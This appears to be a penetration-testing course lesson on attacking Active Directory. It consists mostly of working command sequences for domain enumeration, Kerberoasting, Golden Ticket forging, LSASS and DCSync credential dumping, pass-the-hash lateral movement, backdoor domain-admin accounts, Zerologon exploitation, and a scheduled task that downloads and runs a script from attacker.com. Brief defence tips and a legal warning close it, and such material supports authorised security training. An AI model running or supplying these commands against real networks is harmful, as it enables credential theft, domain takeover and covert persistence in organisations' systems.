# LESSON 9: Active Directory & Windows Attacks

## Objective
Master Active Directory enumeration, Kerberos attacks, and lateral movement techniques in Windows environments. Learn to compromise domain controllers and escalate privileges in enterprise networks.

## Prerequisites
- Lessons 1-8 completed
- Windows domain environment
- Understanding of Windows authentication
- Basic PowerShell knowledge

## Phase 1: Domain Enumeration

### Step 1: Initial Domain Discovery
```powershell
# Basic domain information
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDOMAIN
$env:LOGONSERVER

# Domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.$env:USERDNSDOMAIN
nltest /dclist:$env:USERDOMAIN

# Forest information
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
```

### Step 2: User Enumeration
```powershell
# PowerView commands
Import-Module .\PowerView.ps1

# Get domain users
Get-DomainUser | Select samaccountname,description
Get-DomainUser -Properties samaccountname,description,pwdlastset
Get-DomainUser -Identity "Domain Admins" -Recurse

# Find interesting users
Get-DomainUser -LDAPFilter "(description=*pass*)"
Get-DomainUser -UACFilter DONT_REQ_PREAUTH  # ASREPRoastable users

# BloodHound data collection
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

### Step 3: Group Enumeration
```powershell
# High-privilege groups
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
Get-DomainGroup -Identity "Enterprise Admins" | Get-DomainGroupMember
Get-DomainGroup -Identity "Administrators" | Get-DomainGroupMember

# Find groups with interesting names
Get-DomainGroup | Where-Object {$_.name -match "admin|sql|backup|service"}

# Local admin groups on computers
Find-DomainLocalGroupMember -Recurse
```

### Step 4: Computer Enumeration
```powershell
# Domain computers
Get-DomainComputer | Select name,operatingsystem,lastlogon
Get-DomainComputer -Ping

# Find computers with specific OS
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Unconstrained delegation computers
Get-DomainComputer -UnconstrainedDelegation
```

## Phase 2: Kerberos Attacks

### Step 5: Kerberoasting
```powershell
# Find SPNs
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# Request service tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web.domain.com"

# Extract tickets with Rubeus
.\Rubeus.exe kerberoast /outfile:tickets.txt

# Crack with hashcat
hashcat -m 13100 tickets.txt rockyou.txt
```

### Step 6: ASREPRoasting
```powershell
# Find users with "Do not require Kerberos preauthentication"
Get-DomainUser -PreauthNotRequired | Select samaccountname

# Request AS-REP hashes
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Crack hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

### Step 7: Golden/Silver Ticket Attacks
```powershell
# Dump krbtgt hash (requires Domain Admin)
lsadump::dcsync /domain:domain.com /user:krbtgt

# Create Golden Ticket
kerberos::golden /domain:domain.com /sid:S-1-5-21-... /user:fakeadmin /krbtgt:aes256_key /ticket:golden.kirbi

# Use Golden Ticket
kerberos::ptt golden.kirbi
klist

# Silver Ticket for specific service
kerberos::golden /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:cifs /rc4:service_hash /user:fakeuser
```

## Phase 3: Credential Harvesting

### Step 8: LSASS Dumping
```powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::tspkg

# ProcDump method
procdump.exe -accepteula -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Task Manager method (GUI)
# Right-click lsass.exe -> Create dump file
```

### Step 9: DCSync Attack
```powershell
# Dump specific user
lsadump::dcsync /domain:domain.com /user:administrator

# Dump all hashes (requires appropriate privileges)
lsadump::dcsync /domain:domain.com /all /csv

# Domain controller machine account
lsadump::dcsync /domain:domain.com /user:DC01$
```

### Step 10: Cached Credentials
```powershell
# Extract cached domain logons
privilege::debug
lsadump::cache

# LSA secrets
lsadump::secrets

# DPAPI masterkeys
dpapi::masterkey /in:masterkey_file /sid:user_sid /password:user_password
```

## Phase 4: Lateral Movement

### Step 11: Pass-the-Hash
```powershell
# Using Mimikatz
sekurlsa::pth /user:administrator /domain:domain.com /ntlm:hash /run:cmd.exe

# Using impacket (Linux)
python psexec.py domain/user@target -hashes :ntlm_hash
python wmiexec.py domain/user@target -hashes :ntlm_hash
python smbexec.py domain/user@target -hashes :ntlm_hash
```

### Step 12: Pass-the-Ticket
```powershell
# Export tickets
sekurlsa::tickets /export

# Inject ticket
kerberos::ptt ticket.kirbi

# Verify ticket
klist
```

### Step 13: WMI/DCOM Lateral Movement
```powershell
# WMI command execution
wmic /node:target /user:domain\user /password:password process call create "cmd.exe /c whoami > C:\temp\output.txt"

# PowerShell remoting
$cred = Get-Credential
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock {whoami}

# DCOM execution
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")
```

## Phase 5: Persistence Mechanisms

### Step 14: Domain Persistence
```powershell
# Create backdoor user
net user backdoor P@ssw0rd123! /add /domain
net group "Domain Admins" backdoor /add /domain

# Golden Ticket persistence (indefinite access)
# Already covered in Kerberos section

# AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity user -Rights All

# DCSync rights for user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity user -Rights DCSync
```

### Step 15: Local Persistence
```powershell
# Scheduled tasks
schtasks /create /tn "UpdateTask" /tr "powershell.exe -WindowStyle hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" /sc daily /st 09:00

# Registry autorun
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f

# Service creation
sc create "WindowsUpdateService" binpath= "C:\Windows\System32\backdoor.exe" start= auto
sc start "WindowsUpdateService"
```

## Phase 6: Domain Controller Compromise

### Step 16: DC Enumeration
```powershell
# Find domain controllers
Get-DomainController
nslookup -type=SRV _kerberos._tcp.domain.com

# DC vulnerabilities
Get-DomainController | ForEach {Get-NetSession -ComputerName $_.Name}

# Zerologon check (CVE-2020-1472)
python zerologon_check.py DC01.domain.com
```

### Step 17: DC Exploitation
```powershell
# Zerologon exploitation
python zerologon_exploit.py DC01.domain.com

# PrintNightmare (CVE-2021-1675)
# Install malicious printer driver

# PetitPotam + NTLM Relay
python PetitPotam.py attacker_ip domain_controller_ip
```

## Custom Scripts Usage

### ad_enumeration.py
```bash
# Comprehensive AD enumeration from Linux
python3 scripts/lesson_09_active_directory/ad_enumeration.py --target domain.com --username user --password pass
```

### kerberos_attacks.py
```bash
# Automated Kerberos attack framework
python3 scripts/lesson_09_active_directory/kerberos_attacks.py --target domain.com --attack kerberoast --output tickets.txt
```

## Evidence Collection

### Step 18: Document AD Compromise
```powershell
# Export BloodHound data
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory .\BloodHound\

# Export user/group information
Get-DomainUser | Export-Csv users.csv
Get-DomainGroup | Export-Csv groups.csv
Get-DomainComputer | Export-Csv computers.csv

# Document privilege escalation path
echo "$(Get-Date): Domain Admin achieved via [method]" >> compromise_log.txt
```

## Success Criteria

✓ Domain users and groups enumerated
✓ Kerberos attacks executed successfully  
✓ Credentials harvested from LSASS
✓ Lateral movement achieved
✓ Domain controller compromised
✓ Persistence established
✓ Golden ticket created
✓ Custom scripts functioning

## Active Directory Attack Tools

| Tool | Purpose | Platform |
|------|---------|----------|
| PowerView | AD enumeration | PowerShell |
| BloodHound | AD visualization | Multiple |
| Mimikatz | Credential extraction | Windows |
| Rubeus | Kerberos attacks | .NET |
| Impacket | Protocol attacks | Python |
| Responder | Network attacks | Python |
| CrackMapExec | SMB enumeration | Python |
| Empire/Starkiller | Post-exploitation | PowerShell |

## Attack Paths Summary

### Initial Access
1. **Credential Stuffing**: Known passwords against AD accounts
2. **Kerberoasting**: Crack service account passwords
3. **ASREPRoasting**: Attack accounts without pre-auth
4. **Password Spraying**: Single password against many accounts

### Privilege Escalation  
1. **Token Impersonation**: Steal high-privilege tokens
2. **Kerberos Delegation**: Abuse constrained/unconstrained delegation
3. **GPO Abuse**: Modify group policies for privilege escalation
4. **ACL Abuse**: Exploit excessive permissions

### Persistence
1. **Golden Ticket**: Long-term domain access
2. **Silver Ticket**: Service-specific access
3. **AdminSDHolder**: Persistent admin rights
4. **DCSync Rights**: Ability to extract hashes

## Defense Recommendations

- Enable Advanced Threat Analytics (ATA)
- Monitor for suspicious PowerShell activity
- Implement tiered administrative model
- Use Protected Users group
- Enable Windows Defender ATP
- Regular password policy enforcement
- Kerberos armoring (FAST)
- Monitor for DCSync attempts
- Implement JEA (Just Enough Administration)

## Legal Considerations

⚠️ **CRITICAL WARNING**: Active Directory attacks must only be performed in authorized penetration testing environments or labs you own. Unauthorized access to corporate networks is illegal.

## Next Lesson Preview
**Lesson 10**: macOS Security & Exploitation
- macOS-specific attack vectors
- Privilege escalation techniques
- Persistence mechanisms